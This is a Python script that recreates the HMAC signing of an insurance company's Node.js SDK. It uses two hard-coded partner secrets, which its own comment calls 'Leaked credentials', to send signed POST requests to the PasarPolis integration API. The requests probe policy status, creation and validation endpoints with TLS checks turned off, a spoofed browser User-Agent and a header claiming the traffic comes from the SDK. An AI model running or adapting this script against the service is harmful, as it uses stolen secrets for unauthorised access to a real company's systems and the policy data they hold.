#!/usr/bin/env python3
"""
HMAC Authentication for PasarPolis Integration API
Based on pasarpolis-sdk-nodejs source code
"""
import hashlib
import hmac
import base64
import json
import sys
from datetime import datetime, timezone
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

try:
    import requests
except ImportError:
    print("Installing requests...")
    import subprocess
    subprocess.check_call([sys.executable, '-m', 'pip', 'install', 'requests', '-q'])
    import requests

# Leaked credentials
CREDENTIALS = [
    {"code": "pasarpolis", "secret": "a8516a5b-6ce2-4268-947e-6f10761c91cb"},
    {"code": "umra", "secret": "5d954139-2aa3-44fe-9703-209e3675ffd1"},
]

HOST = "https://integrations.pasarpolis.io"

def generate_hmac_headers(partner_code, partner_secret, path, body_json):
    """Generate HMAC auth headers matching the SDK format"""
    content_type = "application/json"
    date = datetime.now(timezone.utc).strftime('%a, %d %b %Y %H:%M:%S GMT')

    # MD5 of body
    md5 = hashlib.md5(body_json.encode()).hexdigest()

    # Signature payload: POST\n{md5}\n{contentType}\n{date}\n{path}
    sig_payload = f"POST\n{md5}\n{content_type}\n{date}\n{path}"

    # HMAC-SHA256
    signature = hmac.new(
        partner_secret.encode(),
        sig_payload.encode(),
        hashlib.sha256
    ).digest()
    signature_b64 = base64.b64encode(signature).decode()

    # Final signature: base64(partnerCode:signature_b64)
    signature64 = base64.b64encode(f"{partner_code}:{signature_b64}".encode()).decode()

    headers = {
        'Content-MD5': md5,
        'Content-Type': content_type,
        'X-PP-Date': date,
        'Partner-Code': partner_code,
        'Signature': signature64,
        'User-Agent': 'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.4; en-US; rv:1.9.2.2) Gecko/20100316 Firefox/3.6.2',
        'Accept': content_type,
        'API-Call-Source': 'sdk-nodejs'
    }

    return headers

def test_endpoint(partner_code, partner_secret, path, data):
    """Test an endpoint with HMAC auth"""
    body_json = json.dumps(data)
    headers = generate_hmac_headers(partner_code, partner_secret, path, body_json)

    url = HOST + path
    try:
        resp = requests.post(url, data=body_json, headers=headers, verify=False, timeout=15)
        return resp.status_code, resp.text[:500]
    except Exception as e:
        return 0, str(e)

def main():
    # Test endpoints with both credential sets
    endpoints = [
        ("/api/v2/policystatus/", {"ids": ["TEST-001"]}),
        ("/api/v1/config/createpolicy/gadget-protection", {"product": "gadget-protection", "name": "test"}),
        ("/api/v2/createpolicy/", {"product": "gadget-protection", "name": "test"}),
        ("/api/v2/validatepolicy/", {"product": "gadget-protection", "name": "test"}),
        ("/api/v3/policystatus/", {"ids": ["TEST-001"]}),
    ]

    for cred in CREDENTIALS:
        print(f"\n{'='*60}")
        print(f"Testing with partner: {cred['code']}")
        print(f"{'='*60}")

        for path, data in endpoints:
            code, body = test_endpoint(cred['code'], cred['secret'], path, data)
            print(f"\n[{code}] POST {path}")
            print(f"Response: {body[:300]}")

if __name__ == "__main__":
    main()
